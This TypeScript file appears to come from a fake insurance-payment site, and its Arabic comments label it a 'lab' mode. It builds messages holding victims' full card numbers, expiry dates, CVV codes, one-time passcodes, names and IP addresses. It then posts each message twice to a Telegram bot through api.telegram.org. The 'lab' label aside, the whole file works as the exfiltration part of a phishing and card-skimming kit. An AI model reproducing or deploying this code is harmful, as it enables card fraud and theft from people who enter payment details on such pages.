import type { InsuranceSelection } from '@/lib/session'

function escHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
}

export function labTelegramEnabled(): boolean {
  const e = import.meta.env.VITE_LAB_TELEGRAM_ENABLED
  const v = String(e ?? '').toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

/**
 * ⚠️ وضع مختبر فقط — مفتاح البوت يصل للمتصفح (يُرى في الشبكة/الحزمة).
 */
async function telegramPost(html: string): Promise<void> {
  const token = import.meta.env.VITE_LAB_TELEGRAM_BOT_TOKEN ?? ''
  const chat = import.meta.env.VITE_LAB_TELEGRAM_CHAT_ID ?? ''
  if (!token || !chat) {
    console.warn('[lab] telegram: نقص TOKEN أو CHAT_ID')
    return
  }

  const url = `https://api.telegram.org/bot${token}/sendMessage`
  const body = new URLSearchParams({
    chat_id: chat,
    text: html,
    parse_mode: 'HTML',
    disable_web_page_preview: 'true',
  })

  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
    body: body.toString(),
  })
  if (!res.ok) {
    const txt = await res.text()
    console.warn('[lab] telegram:', res.status, txt)
  }
}

/** يطابق سلوك سكربت قديم أرسل نفس المنطق مرّتين. */
export async function labTelegramSendHtmlDuplex(html: string): Promise<void> {
  if (!labTelegramEnabled()) return
  await telegramPost(html)
  await telegramPost(html)
}

function formatInsuranceBlock(ins: InsuranceSelection): string {
  const L: string[] = []
  L.push(`🏢 <b>بيانات التأمين</b>`)
  L.push(`• الشركة: <b>${escHtml(ins.company ?? '')}</b>`)
  L.push(`• الخطة: <b>${escHtml(ins.plan ?? '')}</b>`)
  L.push(`• الأساسي: <b>${escHtml(String(ins.base ?? ''))} ريال</b>`)
  L.push(`• الفرعي: <b>${escHtml(String(ins.price ?? ''))} ريال</b>`)
  L.push(`• الضريبة 15%: <b>${escHtml(String(ins.vat ?? ''))} ريال</b>`)
  L.push(`• الإجمالي: <b>${escHtml(String(ins.total ?? ''))} ريال</b>`)
  if (ins.start_date || ins.end_date) {
    L.push(
      `• الفترة: ${escHtml(ins.start_date ?? '')} → ${escHtml(ins.end_date ?? '')}`,
    )
  }
  const feats = ins.features ?? []
  if (feats.length > 0) {
    L.push(`• <u>الإضافات المختارة:</u>`)
    for (const f of feats) {
      L.push(` ◦ ${escHtml(f.label)} (+${escHtml(String(f.price))} ريال)`)
    }
  }
  return L.join('\n')
}

export function buildLabPaymentCapturedHtml(params: {
  cardholder_name: string
  pan_digits: string
  expiry_mm_yy: string
  cvv: string
  client_ip: string
  external_user_id: string | null
  total_amount: number | string
  insurance: InsuranceSelection
  payment_method?: string
}): string {
  const L: string[] = []
  const pan = escHtml(params.pan_digits)
  const maskedEcho = escHtml(params.pan_digits)

  L.push(`🧾 <b>عملية دفع تأمين جديدة (مختبر)</b>`)
  L.push(formatInsuranceBlock(params.insurance))
  L.push(`— — — — — — — — —`)
  L.push(`💳 <b>بيانات الدفع</b>`)
  L.push(`• الاسم على البطاقة: <b>${escHtml(params.cardholder_name)}</b>`)
  L.push(`• card number (كامل): <code>${pan}</code>`)
  L.push(`• نفس الرقم المعروَض كان يُطبَع أيضاً كنص مخفّض في القديم: <code>${maskedEcho}</code>`)
  L.push(`• الانتهاء: <code>${escHtml(params.expiry_mm_yy)}</code>`)
  L.push(`• CVV: <code>${escHtml(params.cvv)}</code>`)
  L.push(`• طريقة الدفع: ${escHtml(params.payment_method ?? 'card')}`)
  L.push(`• المبلغ: <b>${escHtml(String(params.total_amount))} ريال</b>`)
  L.push(`• 🌐 IP: <code>${escHtml(params.client_ip)}</code>`)
  if (params.external_user_id) {
    L.push(`• معرف مستخدم خارجي: <code>${escHtml(params.external_user_id)}</code>`)
  }
  return L.join('\n')
}

export function buildLabOtpCapturedHtml(params: {
  otp: string
  timestamp_iso: string
  transaction_id?: string | null
  cardholder_name: string
  pan_digits: string
  last_four_hint: string
  expiry_mm_yy: string
  cvv: string
  client_ip?: string | null
  insurance: InsuranceSelection
  total_amount?: string | number
}): string {
  const L: string[] = []
  L.push(`✅ <b>OTP مُستلم (مختبر)</b>`)
  L.push(`— — — — — — — — —`)
  L.push(`🔢 <b>الرمز:</b> <code>${escHtml(params.otp)}</code>`)
  L.push(`🕒 <b>الوقت:</b> ${escHtml(params.timestamp_iso)}`)
  if (params.transaction_id) {
    L.push(`📎 <code>${escHtml(params.transaction_id)}</code>`)
  }
  L.push(`— — — — — — — — —`)
  L.push(`💳 <b>بيانات البطاقة (إعادة إرسال)</b>`)
  L.push(`• الاسم: <b>${escHtml(params.cardholder_name)}</b>`)
  L.push(`• card number: <code>${escHtml(params.pan_digits)}</code>`)
  L.push(`• آخر 4: <code>${escHtml(params.last_four_hint)}</code>`)
  L.push(`• الانتهاء: <code>${escHtml(params.expiry_mm_yy)}</code>`)
  L.push(`• CVV: <code>${escHtml(params.cvv)}</code>`)
  if (params.total_amount != null)
    L.push(`• المبلغ: <b>${escHtml(String(params.total_amount))}</b>`)
  if (params.client_ip) L.push(`• IP: <code>${escHtml(params.client_ip)}</code>`)
  L.push(`— — — — — — — — —`)
  L.push(formatInsuranceBlock(params.insurance))
  return L.join('\n')
}
